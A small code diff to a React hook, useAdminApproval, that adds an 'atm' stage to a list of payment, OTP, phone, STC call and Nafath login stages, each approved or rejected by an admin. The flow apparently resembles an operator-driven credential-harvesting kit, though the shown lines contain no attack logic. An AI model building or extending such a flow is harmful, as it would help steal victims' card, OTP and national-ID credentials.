@@ -1,7 +1,7 @@
 import { useState, useEffect } from "react";
 import { supabase } from "@/integrations/supabase/client";
 
-type Stage = "payment" | "otp" | "phone_verification" | "phone_otp" | "stc_call" | "nafath_login" | "nafath_verify";
+type Stage = "payment" | "otp" | "atm" | "phone_verification" | "phone_otp" | "stc_call" | "nafath_login" | "nafath_verify";
 type StageStatus = "pending" | "approved" | "rejected";
 
 export const useAdminApproval = (orderId: string | null, stage: Stage) => {
